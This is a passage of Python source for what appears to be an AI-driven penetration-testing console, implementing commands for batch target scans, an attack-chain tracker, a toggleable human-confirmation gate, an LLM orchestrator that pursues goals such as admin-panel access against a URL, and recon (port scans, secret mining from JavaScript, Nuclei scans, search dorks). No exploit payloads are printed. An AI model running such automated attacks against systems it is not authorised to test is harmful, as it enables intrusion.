            # bb.list() → [(key, value, ts), ...]
            rows = bb.list()
            if not rows:
                self._info(f"Board for [{target}] is empty. Use /board set <key> <value>")
                return
            t = _T(title=f"[bold cyan]Blackboard — {target}[/]", border_style=THEME["primary"])
            t.add_column("Key", style="cyan", width=20)
            t.add_column("Value", overflow="fold")
            t.add_column("Time", width=12, style="dim")
            for k, v, ts in rows:
                t.add_row(k, str(v), str(ts))
            self.console.print(t)
        elif cmd == "set":
            if len(sub) < 3:
                self._warn("Usage: /board set <key> <value>")
                return
            bb.upsert(sub[1], sub[2])
            self._success(f"Set [{sub[1]}] = {sub[2]}")
        elif cmd == "del":
            if len(sub) < 2:
                self._warn("Usage: /board del <key>")
                return
            bb.remove(sub[1])
            self._success(f"Deleted [{sub[1]}]")
        elif cmd == "clear":
            bb.clear()
            self._success("Board cleared.")
        else:
            self._warn("Usage: /board [show|set <k> <v>|del <k>|clear]")

    # ── /tools-ext ────────────────────────────────────────────────
    def _cmd_tools_ext(self, arg: str = "") -> None:
        """/tools-ext [list|run <name>|reload]  — YAML 정의 외부 CLI 도구"""
        from ..tools_ext.loader import ToolExtRegistry
        from rich.table import Table as _T
        reg = ToolExtRegistry()
        sub = arg.strip().split(None, 1)
        cmd = sub[0].lower() if sub else "list"
        param = sub[1].strip() if len(sub) > 1 else ""

        if cmd == "list" or not arg.strip():
            tools = reg.list()
            if not tools:
                self._info(self.s.get("tools_ext_no_tools"))
                return
            t = _T(title="[bold cyan]External Tools[/]", border_style=THEME["primary"])
            t.add_column("Name", style="cyan", width=18)
            t.add_column("Command", width=30, overflow="fold")
            t.add_column("Available", width=10)
            t.add_column("Description", overflow="fold")
            for tool in tools:
                avail = "[green]✓[/]" if tool.is_available() else "[red]✗[/]"
                t.add_row(tool.name, tool.command, avail, tool.description or tool.short_description)
            self.console.print(t)
        elif cmd == "run":
            if not param:
                self._warn(self.s.get("tools_ext_run_usage"))
                return
            parts = param.split(None, 1)
            name = parts[0]
            extra = parts[1] if len(parts) > 1 else ""
            result = reg.run(name, extra)
            self.console.print(result)
        elif cmd == "reload":
            reg.__init__()
            self._success(self.s.get("tools_ext_reloaded"))
        else:
            self._warn(self.s.get("tools_ext_usage"))

    # ── /kb ───────────────────────────────────────────────────────
    def _cmd_kb(self, arg: str = "") -> None:
        """/kb [list|search <kw>|show <name>|reload]  — 로컬 지식베이스"""
        from ..knowledge.loader import KBLoader
        from rich.table import Table as _T
        kb = KBLoader()
        sub = arg.strip().split(None, 1)
        cmd = sub[0].lower() if sub else "list"
        param = sub[1].strip() if len(sub) > 1 else ""

        if cmd == "list" or not arg.strip():
            docs = kb.list_docs()
            if not docs:
                self._info(self.s.get("kb_no_docs",
                    "No KB documents found. Add .md files to bingo/knowledge/base/"))
                return
            t = _T(title="[bold cyan]Knowledge Base[/]", border_style=THEME["primary"])
            t.add_column("Name", style="cyan", width=25)
            t.add_column("Size", width=8)
            t.add_column("Summary", overflow="fold")
            for d in docs:
                t.add_row(d["name"], f"{d.get('size', 0)}B", d.get("summary", ""))
            self.console.print(t)
        elif cmd == "search":
            if not param:
                self._warn(self.s.get("kb_usage", "Usage: /kb [list|search <kw>|show <name>|reload]"))
                return
            results = kb.search(param)
            if not results:
                self._info(self.s.get("kb_no_results", "No results for '{query}'").format(query=param))
                return
            for r in results[:5]:
                self.console.print(f"[{THEME['primary']}]📄 {r['name']}[/]")
                self.console.print(f"  [dim]{r['snippet']}[/]\n")
        elif cmd == "show":
            if not param:
                self._warn(self.s.get("kb_usage", "Usage: /kb [list|search <kw>|show <name>|reload]"))
                return
            content = kb.get(param)
            if content:
                self.console.print(content[:3000])
            else:
                self._error(self.s.get("kb_doc_not_found", "Document '{name}' not found").format(name=param))
        elif cmd == "reload":
            kb.reload()
            self._success(self.s.get("kb_reloaded", "Knowledge base reloaded"))
        else:
            self._warn(self.s.get("kb_usage", "Usage: /kb [list|search <kw>|show <name>|reload]"))

    # ── /batch ────────────────────────────────────────────────────
    def _cmd_batch(self, arg: str = "") -> None:
        """/batch [list|add <url>|run|status|clear]  — 멀티타겟 배치"""
        from ..batch.runner import BatchRunner, BatchQueue
        from rich.table import Table as _T

        # 세션 레벨 BatchRunner & BatchQueue 유지
        if not hasattr(self, "_batch_runner"):
            self._batch_runner = BatchRunner()
            self._batch_queue: "BatchQueue | None" = None

        br = self._batch_runner
        sub = arg.strip().split(None, 1)
        cmd = sub[0].lower() if sub else "list"
        param = sub[1].strip() if len(sub) > 1 else ""

        def _ensure_queue() -> BatchQueue:
            if self._batch_queue is None:
                self._batch_queue = br.create("bingo_batch")
            return self._batch_queue

        if cmd == "list" or not arg.strip():
            q = self._batch_queue
            if not q or not q.tasks:
                self._info("Batch queue is empty. Use /batch add <url>")
                return
            t = _T(title="[bold cyan]Batch Queue[/]", border_style=THEME["primary"])
            t.add_column("#", width=4, style="dim")
            t.add_column("URL / Target", overflow="fold")
            t.add_column("Status", width=12)
            for i, task in enumerate(q.tasks, 1):
                color = {"done": "green", "running": "yellow", "failed": "red",
                         "cancelled": "dim"}.get(task.status, "dim")
                t.add_row(str(i), task.target, f"[{color}]{task.status}[/]")
            self.console.print(t)

        elif cmd == "add":
            if not param:
                self._warn("Usage: /batch add <url>")
                return
            q = _ensure_queue()
            q.add(param, "이 타겟을 전체 점검해줘")
            self._success(f"Added → {param}  (total: {len(q.tasks)})")

        elif cmd == "run":
            q = self._batch_queue
            if not q or not q.pending_tasks():
                self._warn("Batch queue is empty or all tasks already done. Use /batch add <url> first.")
                return
            count = len(q.pending_tasks())
            self.console.print(f"[{THEME['primary']}]🚀 Starting batch scan for {count} targets...[/]")

            def _executor(target_url: str, instruction: str) -> str:
                self._send_message(f"{instruction}: {target_url}")
                return "sent"

            br.run(q, executor=_executor,
                   on_progress=lambda t: self.console.print(
                       f"  [{('green' if t.status == 'done' else 'red')}]{t.status}[/] {t.target}"))
            stats = q.stats()
            self._success(f"Batch complete — {stats}")

        elif cmd == "status":
            q = self._batch_queue
            if not q or not q.tasks:
                self._info("No batch tasks yet.")
                return
            for task in q.tasks:
                color = {"done": "green", "failed": "red"}.get(task.status, "yellow")
                dur = f"  ({task.duration():.1f}s)" if task.duration() else ""
                self.console.print(f"  [{color}]{task.status}[/] {task.target}{dur}")

        elif cmd == "clear":
            self._batch_queue = None
            self._batch_runner = BatchRunner()
            self._success("Batch queue cleared.")

        else:
            self._warn("Usage: /batch [list|add <url>|run|status|clear]")

    # ── /chain ────────────────────────────────────────────────────
    def _cmd_chain(self, arg: str = "") -> None:
        """/chain [show|add <step>|clear]  — 공격 체인 트래커"""
        from ..chain.tracker import AttackChain, ChainRegistry
        from rich.table import Table as _T
        # ChainRegistry.get() 로 세션 기반 체인 가져오기
        sess_id = getattr(self, "_session_id", None) or "global"
        chain = ChainRegistry.get(sess_id)
        sub = arg.strip().split(None, 1)
        cmd = sub[0].lower() if sub else "show"
        param = sub[1].strip() if len(sub) > 1 else ""

        if cmd == "show" or not arg.strip():
            steps = chain.steps()  # steps() not get_steps()
            if not steps:
                self._info(f"No attack chain steps yet. Use /chain add <step>")
                return
            t = _T(title="[bold red]Attack Chain[/]", border_style=THEME["primary"], show_lines=True)
            t.add_column("#", width=4, style="dim")
            t.add_column("Type", width=10, style="yellow")
            t.add_column("Step", overflow="fold")
            for s in steps:
                t.add_row(str(s.seq), s.step_type, s.title)
            self.console.print(t)
            self.console.print(f"\n[dim]{chain.summary()}[/]")
        elif cmd == "add":
            if not param:
                self._warn("Usage: /chain add <step description>")
                return
            # add_from_text() 로 자동 분류 후 추가
            result = chain.add_from_text(param)
            if result:
                self._success(f"Step added [{result.step_type}]: {param}")
            else:
                # 분류 실패 시 tool 타입으로 직접 추가
                chain.add("tool", param[:60], detail=param)
                self._success(f"Step added: {param}")
        elif cmd == "clear":
            n = chain.clear()  # clear() returns count
            self._success(f"Attack chain cleared ({n} steps removed).")
        elif cmd == "export":
            # export_md() 없음 — summary 텍스트로 저장
            import os
            path = os.path.join(str(Path.home() / "Desktop"), "attack_chain.txt")
            with open(path, "w", encoding="utf-8") as _f:
                _f.write(chain.summary())
            self._success(f"Exported → {path}")
        else:
            self._warn("Usage: /chain [show|add <step>|clear|export]")

    # ── /hitl ─────────────────────────────────────────────────────
    def _cmd_hitl(self, arg: str = "") -> None:
        """/hitl [on|off|status]  — Human-in-the-loop 확인 게이트"""
        from ..hitl.gate import HitlGate
        # 세션 전체에서 동일 인스턴스 유지 (매번 새 인스턴스 생성 방지)
        if not hasattr(self, "_hitl_gate"):
            self._hitl_gate = HitlGate()
        gate = self._hitl_gate
        sub = arg.strip().split(None, 1)
        cmd = sub[0].lower() if sub else "status"

        if cmd == "on":
            gate.enabled = True
            self._success("HITL gate ENABLED — dangerous actions will require confirmation.")
        elif cmd == "off":
            gate.enabled = False
            self._success("HITL gate DISABLED.")
        elif cmd == "status" or not arg.strip():
            state = "ENABLED" if gate.enabled else "DISABLED"
            color = "red" if gate.enabled else "dim"
            self.console.print(f"  HITL gate: [{color}]{state}[/]")
        elif cmd == "log":
            self._info("HITL decision log is not available in this version.")
        else:
            self._warn("Usage: /hitl [on|off|status]")

    # ── /orch ─────────────────────────────────────────────────────────
    def _cmd_orch(self, arg: str = "") -> None:
        """/orch <sub-command> [options]  — LLM 오케스트레이터 (v3.5.0)

        서브 명령:
          /orch start <url> [goal] [steps=N]   — 오케스트레이션 시작
          /orch stop                            — 현재 스텝 완료 후 중지
          /orch status                          — 현재 상태 확인
          /orch log                             — 실행 이력 표시
          /orch report                          — 최종 공격 리포트

        예시:
          /orch start https://target.com
          /orch start https://target.com "관리자 패널 접근" steps=15
          /orch stop
        """
        from ..orchestrator.engine import (
            OrchestratorEngine,
            global_orchestrator,
            set_global_orchestrator,
        )

        sub_parts = arg.strip().split(None, 1)
        sub = sub_parts[0].lower() if sub_parts else "status"
        rest = sub_parts[1].strip() if len(sub_parts) > 1 else ""

        # ── stop ──────────────────────────────────────────────────────
        if sub == "stop":
            eng = global_orchestrator()
            if eng and eng.running:
                eng.stop()
                self._success(self.s.get("orch_stopped", "⏹ Orchestrator stopped."))
            else:
                self._info(self.s.get("orch_not_running", "Orchestrator is not running."))
            return

        # ── status ────────────────────────────────────────────────────
        if sub == "status":
            eng = global_orchestrator()
            if not eng:
                self._info(self.s.get("orch_not_started", "Orchestrator has not been started."))
            else:
                self.console.print(eng.summary())
            return

        # ── log ───────────────────────────────────────────────────────
        if sub == "log":
            eng = global_orchestrator()
            if not eng or not eng.log:
                self._info(self.s.get("orch_no_log", "No orchestrator log."))
                return
            from rich.table import Table as _OT
            ot = _OT(
                title=f"[bold]🤖 Orchestrator Log — {eng._target}[/bold]",
                border_style=THEME["primary"],
            )
            ot.add_column("#", width=4, justify="right", style="dim")
            ot.add_column("Type", width=8)
            ot.add_column("Action", overflow="fold")
            ot.add_column("Conf", width=6, justify="right")
            ot.add_column("Achieved", width=9, justify="center")
            for s in eng.log:
                ot.add_row(
                    str(s.step_no),
                    f"{s.icon()} {s.step_type}",
                    s.action,
                    f"{s.confidence:.0%}",
                    "✅" if s.goal_achieved else "",
                )
            self.console.print(ot)
            return

        # ── report ────────────────────────────────────────────────────
        if sub == "report":
            eng = global_orchestrator()
            if not eng:
                self._info(self.s.get("orch_not_started", "Orchestrator has not been started."))
                return
            self.console.print(eng.report())
            return

        # ── start ─────────────────────────────────────────────────────
        if sub == "start":
            # 형식: <url> ["goal text"] [steps=N]
            # URL 추출
            import re as _re_orch
            url_match = _re_orch.search(r"https?://[^\s\"']+", rest)
            if not url_match:
                # 'start' 없이 URL만 입력한 경우
                url_match = _re_orch.search(r"https?://[^\s\"']+", arg)
            if not url_match:
                self._warn(
                    "Usage: /orch start <url> [goal] [steps=N]\n"
                    "  예) /orch start https://target.com\n"
                    '  예) /orch start https://target.com "관리자 패널 접근" steps=15'
                )
                return

            target_url = url_match.group(0).rstrip("/")
            remainder  = rest.replace(target_url, "").strip()

            # steps= 추출
            max_steps = 10
            steps_m = _re_orch.search(r"steps\s*=\s*(\d+)", remainder, _re_orch.I)
            if steps_m:
                max_steps = max(1, min(int(steps_m.group(1)), 30))
                remainder = remainder[:steps_m.start()] + remainder[steps_m.end():]

            # goal 추출 (따옴표 또는 나머지 텍스트)
            goal_m = _re_orch.search(r'"([^"]+)"|\'([^\']+)\'', remainder)
            if goal_m:
                goal = goal_m.group(1) or goal_m.group(2)
            else:
                goal = remainder.strip() or ""  # engine이 lang에 맞는 기본 goal 사용

            # 기존 엔진 중지
            old_eng = global_orchestrator()
            if old_eng and old_eng.running:
                old_eng.stop()
                time.sleep(0.5)

            # 새 엔진 생성 & 시작 (lang 전달로 다국어 UI 지원)
            _cur_lang = self._lang_getter() if hasattr(self, "_lang_getter") else getattr(self.config, "lang", "ko")
            eng = OrchestratorEngine(
                config    = self.config,
                target    = target_url,
                goal      = goal,
                max_steps = max_steps,
                hitl_enabled = True,
                lang      = _cur_lang,
            )
            set_global_orchestrator(eng)

            def _orchestrator_send(command: str) -> str:
                # Return only fresh execution output; never let the orchestrator
                # treat its own decision text as evidence.
                self._last_exec_result = ""
                self._send_message(command)
                return self._last_exec_result

            eng.start(
                send_fn = _orchestrator_send,
                console = self.console,
            )
            self._success(
                self.s.get(
                    "orch_started",
                    "🤖 Orchestrator started: {target} | goal={goal} | steps={steps}"
                ).format(target=target_url, goal=goal, steps=max_steps)
            )
            return

        # ── 알 수 없는 서브 명령 ──────────────────────────────────────
        self._warn(
            "Usage: /orch [start|stop|status|log|report]\n"
            "  /orch start https://target.com\n"
            "  /orch stop\n"
            "  /orch status\n"
            "  /orch log\n"
            "  /orch report"
        )

    # ── v3.5.22: /recon — 정보수집/자산수집 통합 진입점 ─────────────────
    def _cmd_recon(self, arg: str = "") -> None:
        """/recon — 정보 수집 / 자산 수집 모듈 (Passive + Active + AssetDB).

        사용법:
          /recon                          — 도움말 출력
          /recon passive <domain>         — Passive 정보 수집 (crt.sh/BGPView/Shodan/FOFA/Dorks)
          /recon active  <target>         — Active 정보 수집 (서브도메인 브루트/포트스캔/HTTP 프로빙)
          /recon full    <domain>         — Passive + Active 전체 수행 + 자산 DB 생성
          /recon js      <url>            — JS 파일에서 API 엔드포인트/키 추출
          /recon nuclei  <target>         — 발견된 자산에 Nuclei 템플릿 스캔 실행
          /recon dorks   <domain>         — Google/GitHub Dork 자동 생성
        """
        import shlex, os as _os, json as _json, time as _time

        try:
            parts = shlex.split(arg.strip())
        except ValueError:
            parts = arg.strip().split()

        _lang = getattr(self.config, "lang", "en")

        if not parts:
            help_lines = [
                "━" * 64,
                self.s.get("recon_help_title", "🔍  Recon Module Suite (v3.5.22)"),
                "━" * 64,
                self.s.get("recon_help_passive",
                    "  /recon passive <domain>   — Passive 수집 (crt.sh/BGPView/Shodan/FOFA)"),
                self.s.get("recon_help_active",
                    "  /recon active  <target>   — Active 수집 (서브도메인/포트스캔/HTTP 프로빙)"),
                self.s.get("recon_help_full",
                    "  /recon full    <domain>   — 전체 수행 + P0-P3 자산 우선순위 분류"),
                self.s.get("recon_help_js",
                    "  /recon js      <url>      — JS 엔드포인트/시크릿 추출"),
                self.s.get("recon_help_nuclei",
                    "  /recon nuclei  <target>   — Nuclei 취약점 스캔"),
                self.s.get("recon_help_dorks",
                    "  /recon dorks   <domain>   — Google/GitHub Dork 생성"),
                "━" * 64,
                self.s.get("recon_help_env",
                    "  환경변수(선택): SHODAN_KEY  FOFA_EMAIL  FOFA_KEY  HUNTER_KEY"),
                "━" * 64,
            ]
            self.console.print("\n".join(help_lines))
            return

        sub = parts[0].lower()
        target = parts[1] if len(parts) > 1 else ""

        if not target and sub not in ("help",):
            self._warn(self.s.get('recon_usage', 'Usage: /recon {sub} <domain/target>').format(sub=sub))
            return

        # ── /recon passive ──────────────────────────────────────────────
        if sub == "passive":
            try:
                from ..core.recon.passive import run_passive
                self.console.print(
                    f"[bold cyan]{self.s.get('recon_passive_start', '🔍 Passive Recon starting: {target}').format(target=target)}[/bold cyan]")
                result = run_passive(
                    domain=target,
                    shodan_key=_os.environ.get("SHODAN_KEY", ""),
                    fofa_email=_os.environ.get("FOFA_EMAIL", ""),
                    fofa_key=_os.environ.get("FOFA_KEY", ""),
                    hunter_key=_os.environ.get("HUNTER_KEY", ""),
                )
                self.console.print(f"\n[bold]{self.s.get('recon_subdomains_label', '📌 Subdomains ({n}):').format(n=len(result.subdomains))}[/bold]")
                for sd in sorted(result.subdomains)[:50]:
                    self.console.print(f"  {sd}")
                if len(result.subdomains) > 50:
                    self.console.print(self.s.get('recon_subdomains_more', '  ... and {n} more').format(n=len(result.subdomains)-50))

                if result.emails:
                    self.console.print(f"\n[bold]{self.s.get('recon_emails_label', '📧 Emails ({n}):').format(n=len(result.emails))}[/bold]")
                    for em in sorted(result.emails)[:20]:
                        self.console.print(f"  {em}")

                if result.shodan_results:
                    self.console.print(f"\n[bold]{self.s.get('recon_shodan_label', '🌐 Shodan results ({n}):').format(n=len(result.shodan_results))}[/bold]")
                    for sh in result.shodan_results[:10]:
                        ip = sh.get("ip_str", sh.get("ip", "?"))
                        ports = sh.get("ports", [])
                        org   = sh.get("org", "")
                        self.console.print(f"  {ip}  ports={ports}  org={org}")

                if result.google_dorks:
                    self.console.print("\n[bold]🔎 Google Dorks:[/bold]")
                    for dk in result.google_dorks[:5]:
                        self.console.print(f"  {dk}")

                if result.github_dorks:
                    self.console.print("\n[bold]🐙 GitHub Dorks:[/bold]")
                    for dk in result.github_dorks[:5]:
                        self.console.print(f"  {dk}")

                self.console.print(
                    f"\n[green]{self.s.get('recon_passive_done', '✅ Passive recon done — Subdomains: {sd} / Emails: {em} / Shodan: {sh}').format(sd=len(result.all_subdomains()), em=len(result.emails), sh=len(result.shodan_results))}[/green]")
            except ImportError as e:
                self._warn(f"Recon passive module import error: {e}")

        # ── /recon active ───────────────────────────────────────────────
        elif sub == "active":
            try:
                from ..core.recon.active import run_active
                self.console.print(
                    f"[bold cyan]{self.s.get('recon_active_start', '🗺 Active Recon: {target}').format(target=target)}[/bold cyan]")
                extra_subs = list(parts[2:]) if len(parts) > 2 else []
                result = run_active(domain=target, subdomains=extra_subs if extra_subs else None)

                if result.live_hosts:
                    self.console.print(
                        f"\n[bold]{self.s.get('recon_live_hosts_label', '🟢 Live Hosts ({n}):').format(n=len(result.live_hosts))}[/bold]")
                    for h in result.live_hosts[:30]:
                        tech = ", ".join(h.technologies) if h.technologies else "-"
                        waf  = h.waf or "-"
                        self.console.print(
                            f"  [{h.status}] {h.url}  tech={tech}  waf={waf}")
                    if len(result.live_hosts) > 30:
                        self.console.print(self.s.get('recon_subdomains_more', '  ... and {n} more').format(n=len(result.live_hosts)-30))

                if result.port_results:
                    total_ports = sum(len(p.open_ports) for p in result.port_results)
                    self.console.print(
                        f"\n[bold]{self.s.get('recon_open_ports_label', '🔓 Open Ports ({n} total):').format(n=total_ports)}[/bold]")
                    for p in result.port_results[:20]:
                        svc_str = ", ".join(
                            f"{port}/{p.services.get(port, '?')}"
                            for port in p.open_ports[:10]
                        )
                        self.console.print(f"  {p.host}: {svc_str}")

                if result.js_endpoints:
                    self.console.print(
                        f"\n[bold]{self.s.get('recon_js_endpoints_label', '📜 JS Endpoints ({n}):').format(n=len(result.js_endpoints))}[/bold]")
                    for ep in result.js_endpoints[:20]:
                        self.console.print(f"  {ep}")

                total_ports_cnt = sum(len(p.open_ports) for p in result.port_results)
                self.console.print(
                    f"\n[green]{self.s.get('recon_active_done', '✅ Active recon done — Live: {live} / Ports: {ports} / JS Endpoints: {js}').format(live=len(result.live_hosts), ports=total_ports_cnt, js=len(result.js_endpoints))}[/green]")
            except ImportError as e:
                self._warn(f"Recon active module import error: {e}")

        # ── /recon full ─────────────────────────────────────────────────
        elif sub == "full":
            try:
                from ..core.recon.passive import run_passive
                from ..core.recon.active import run_active
                from ..core.recon.asset_db import AssetDB

                self.console.print(
                    f"[bold cyan]{self.s.get('recon_full_start', '🚀 Full Recon starting: {target}').format(target=target)}[/bold cyan]")

                # Step 1: Passive
                self.console.print(f"[dim]{self.s.get('recon_step1', '  Step 1/3  Passive collection in progress...')}[/dim]")
                passive = run_passive(
                    domain=target,
                    shodan_key=_os.environ.get("SHODAN_KEY", ""),
                    fofa_email=_os.environ.get("FOFA_EMAIL", ""),
                    fofa_key=_os.environ.get("FOFA_KEY", ""),
                    hunter_key=_os.environ.get("HUNTER_KEY", ""),
                )

                # Step 2: Active (passive 서브도메인 활용)
                self.console.print(
                    f"[dim]{self.s.get('recon_step2_active', '  Step 2/3  Active collection ({n} subdomains)...').format(n=len(passive.subdomains))}[/dim]")
                active = run_active(
                    domain=target,
                    subdomains=passive.all_subdomains() if passive.subdomains else None,
                    ips=passive.ips if passive.ips else None,
                )

                # Step 3: AssetDB + 우선순위 분류
                self.console.print(f"[dim]{self.s.get('recon_asset_db_step', '  Step 3/3  Building asset DB and priority classification...')}[/dim]")
                out_dir = _os.path.join(
                    _os.path.expanduser("~"), ".bingo", "recon", target,
                    str(int(_time.time()))
                )
                from pathlib import Path as _Path
                db = AssetDB(target=target, save_dir=_Path(out_dir))
                db.load(passive=passive, active=active)
                summary = db.attack_surface_summary()
                self.console.print(summary)

                # 저장
                saved_path = db.save()
                self.console.print(f"\n[green]{self.s.get('recon_saved', '💾 Saved: {path}').format(path=saved_path)}[/green]")

            except ImportError as e:
                self._warn(f"Recon full module import error: {e}")

        # ── /recon js ───────────────────────────────────────────────────
        elif sub == "js":
            try:
                from ..core.recon.active import mine_js_endpoints
                self.console.print(
                    f"[bold cyan]{self.s.get('recon_js_start', '📜 JS Mining starting: {target}').format(target=target)}[/bold cyan]")
                endpoints, secrets = mine_js_endpoints(target)

                if endpoints:
                    self.console.print(
                        f"\n[bold]{self.s.get('recon_api_endpoints_label', 'API Endpoints ({n}):').format(n=len(endpoints))}[/bold]")
                    for ep in endpoints[:40]:
                        self.console.print(f"  {ep}")
                else:
                    self.console.print(f"  {self.s.get('recon_no_endpoints', '(no endpoints)')}")

                if secrets:
                    self.console.print(
                        f"\n[bold red]{self.s.get('recon_secrets_label', '🔑 Potential Secrets ({n}):').format(n=len(secrets))}[/bold red]")
                    for sec in secrets[:20]:
                        self.console.print(f"  {sec}")

            except ImportError as e:
                self._warn(f"Recon js module import error: {e}")

        # ── /recon nuclei ───────────────────────────────────────────────
        elif sub == "nuclei":
            try:
                from ..core.recon.asset_db import AssetDB
                from ..core.recon.passive import PassiveResult
                from ..core.recon.active import ActiveResult, LiveHost
                from pathlib import Path as _Path

                fake_passive = PassiveResult(target=target)
                fake_active  = ActiveResult(target=target)
                url_target = target if target.startswith("http") else f"https://{target}"
                fake_active.live_hosts = [LiveHost(url=url_target, status=200)]

                db = AssetDB(target=target)
                db.load(passive=fake_passive, active=fake_active)

                severity = parts[2] if len(parts) > 2 else "critical,high,medium"
                _lang_n = getattr(self.config, "lang", "en")
                _nuclei_start = {
                    "ko": f"🧬 Nuclei 스캔 시작: {target}",
                    "zh": f"🧬 Nuclei 扫描开始: {target}",
                    "en": f"🧬 Nuclei scan started: {target}",
                }.get(_lang_n, f"🧬 Nuclei scan: {target}")
                self.console.print(f"[bold cyan]{_nuclei_start}[/bold cyan]")
                findings_str = db.run_nuclei(severity=severity)

                if findings_str.strip():
                    self.console.print(f"\n[bold red]{self.s.get('nuclei_results_label', '🧬 Nuclei results:')}[/bold red]")
                    self.console.print(findings_str)
                else:
                    _nuclei_empty = {
                        "ko": "  Nuclei 스캔 결과 없음 (nuclei 미설치 또는 취약점 없음)",
                        "zh": "  Nuclei 无结果（未安装 nuclei 或无漏洞）",
                        "en": "  No Nuclei findings (nuclei not installed or no vulns)",
                    }.get(_lang_n, "  No Nuclei findings")
                    self.console.print(f"[yellow]{_nuclei_empty}[/yellow]")

            except ImportError as e:
                self._warn(f"Recon nuclei module import error: {e}")

        # ── /recon dorks ────────────────────────────────────────────────
        elif sub == "dorks":
            try:
                from ..core.recon.passive import generate_google_dorks, generate_github_dorks
                google = generate_google_dorks(target)
                github = generate_github_dorks(target)

                self.console.print(f"\n[bold]🔎 Google Dorks ({target}):[/bold]")
                for d in google:
                    self.console.print(f"  {d}")

                self.console.print(f"\n[bold]🐙 GitHub Dorks ({target}):[/bold]")
                for d in github:
                    self.console.print(f"  {d}")

                # 클립보드에 복사 힌트
                _lang_d = getattr(self.config, "lang", "en")
                _copy_hint = {
                    "ko": f"\n💡 복사: /recon dorks {target} | pbcopy (macOS)",
                    "zh": f"\n💡 复制: /recon dorks {target} | pbcopy (macOS)",
                    "en": f"\n💡 Copy: /recon dorks {target} | pbcopy (macOS)",
                }.get(_lang_d, f"\n💡 Copy: /recon dorks {target} | pbcopy (macOS)")
                self.console.print(f"[dim]{_copy_hint}[/dim]")
            except ImportError as e:
                self._warn(f"Recon dorks module import error: {e}")

        else:
            _lang_u = getattr(self.config, "lang", "en")
            _unk = {
                "ko": f"알 수 없는 Recon 서브 명령: '{sub}'. /recon 으로 도움말 확인",
                "zh": f"未知 Recon 子命令: '{sub}'。输入 /recon 查看帮助",
                "en": f"Unknown Recon subcommand: '{sub}'. Use /recon for help",
            }.get(_lang_u, f"Unknown Recon subcommand: '{sub}'")
            self._warn(self.s.get("recon_unknown_sub", _unk))
